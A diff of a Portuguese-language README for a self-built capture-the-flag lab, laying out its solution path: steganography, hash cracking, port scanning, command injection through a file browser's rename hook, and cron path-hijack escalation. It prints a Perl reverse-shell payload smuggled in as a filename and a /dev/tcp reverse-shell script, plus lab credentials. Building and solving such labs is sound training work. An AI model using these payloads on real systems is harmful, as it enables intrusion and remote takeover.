@@ -6,17 +6,130 @@ docker compose build --no-cache && docker compose up -d
 go to localhost:97 to find post-auth code injection vulnerability
 - MUST: login as admin, go to settings, set command `sh -c "echo this filename has been renamed: \$FILE"` AFTER RENAME, and save.
 
-port:87: vulneravel a code injection pelo rename
-- precisa entrar como admin e setar ```sh -c "echo this filename has been renamed: $FILE"``` after RENAME
-
+- FTP port 48
+- file-broswer port 93
 
 # Resolvendo CTF
-- va /scene.html
-    strings, exiftool, break hash ()
-- acessa FTP senha cooper
-- encontre file browser. use o hook depois de RENAME pra revshell. hook deve ser configurado apos docker build
-- leia o cronjob e faca path hijack: crie executavel supernova/singularity/singularity
 
+## Index.html
+1. acesse index.html , exiftool no video. ou melhor, burpsuite p descobrir de onde vem arquive 
+2. encontre /scene1 
+
+## /scene1
+3. 1. strings no gif, usar linha mais curta `lessence` (se [e q escreve assim])
+3. 1. exiftool no video de scene1 
+```
+    Encoder                         :  $ 6$<yummy>$
+    XMP Toolkit                     : Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//
+    Artist                          : YWVzcGFGaWxlcw==
+```
+3. 2. decodando:
+```
+$ echo -n "YWVzcGFGaWxlcw==" | base64 -d
+aespaFiles
+```
+3. 3.  Quebra de hash (nota que a senha esta em rockyou)
+``
+```
+$ hashid -m '$6$lexistence$Yp2586tEONHHNO8K2K4eAH6iEajQEV6HHPg65vkXQFWLGVO9K9fg.TWDrhqsqXlgLpV55qwAgOUGlEsO//EY//'
+[+] SHA-512 Crypt [Hashcat Mode: 1800]
+...
+
+$ hashcat -m 1800 -a 0 hash.txt p.txt 
+...
+Candidates.#1....: cooper -> cooper
+...
+
+```
+## /run
+4. Baixar tdas imagens e run `strings <image>`
+5. Decodar a mensagem escondida em base64
+6. a ningning (cisne) tem 2 hashes. essas serao as passphrases p steghide dps
+6. 1. simples, jogar no crackstation.com SHA512
+6. 2. bcrypt
+```
+# supernovaflyingbakekang esta na rockyou
+$ echo "supernovaflyingbakekang" > wordlist.txt
+
+# Create a file for the hash (use SINGLE quotes to prevent $ expansion)
+$ echo '$2y$10$QeZOHz29PR59KijGcxR/bu0BcqKvWo23IY7lduxbKiwqIJ8aBjtvq' > hash.txt
+
+hashcat -m 3200 -a 0 hash.txt wordlist.txt
+```
+
+## Ftp 
+6.  Pegar credenciais do video extra[ido do clipe ]
+```
+$ binwalk -e complaexity_trailer.mp4 
+# senha da ningning em /run
+$steghide extract -sf extractions/complaexity_trailer.mp4.extracted/138A085/image.jpg -p "complexity"
+wrote extracted data to "who_are_they.txt".
+```
+6. 1. Em `who_are_they.txt`
+```
+  user: complexity
+  password: complexitytrailer
+  Port of file-browser
+```
+ <!-- todo fix complexity trailer maybe (colocar /orig/who_are_you.txt na imagem com steghide, e a imagem no video ) -->
+
+7. Qual essa port?
+```
+# escaneia todas portas abaixo de 1000
+# segue dica da karina em /run
+$ sudo nmap -sS -p-1000 target_ip
+# ou todas ports
+$ sudo nmap -sS -p- -Pn --min-rate 1000 <targe
+```
+<!-- TODO execute & colar resultado  -->
+
+## File browser 
+<!-- (users criados em `entry.sh`, ver credenciais la) -->
+<!-- Lembrar que é necessário um admin ter setado um comando vulnerável depois de uma ação válida para  user da atacante
+usaremos `sh -c "echo this old filename has been changed and is now deprecated: \$FILE"` . Admin armageddon senha em entry.sh-->
+8. Login de 6.1. Essa versão de file browser tem CVE. 
+    Note um arquivo MKV (lossless format). 
+    Steghide funciona pra imagem, áudio, não vídeo. 
+    Mkv permite extrair áudio sem perder dados.
+    Extrai-se o áudio e aplica steghide passphrase `supernovaflyingbakekang`(ningning \run).
+```
+TODO
+```
+    Eventualmente isso leva à `sh -c "echo this old filename has been changed and is now deprecated: \$FILE" ` 
+
+## Initial Foothold
+9. Renomeia arquivo duas vezes. o nome é a reverse shell
+<!-- todo encontrar um comando q entregue uma revshell menos insuportavel -->
+```
+; perl -e 'use Socket;$i="<ATTACKER_IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+```
+10. strings no gif.
+
+
+## Priviledge Escalation
+11. Explorar git em `supernova`
+12. encontrar uma senha no HISTóRICO do git. Deve estar em files deletados
+13. Usar sudo p ler um arquivo, descobre cronjob a cana X min
+
+```
+sudo cat /etc/cr
+on.d/wda4
+```
+
+14. then execute path hijack. espere que o processo cron automaticamente roda.
+```
+mkdir singularity 
+cd singularity 
+echo '#!/bin/bash' > singularity
+echo 'bash -i >& /dev/tcp/192.168.15.14/4441 0>&1' >> singularity
+chmod +x singularity
+export PATH=/home/supernova/singularity:$PATH
+echo $PATH
+```
+----
+# Bash prompt: singularity runs randomly before each prompt
+
+---
 ## steganography nas midias
 
 
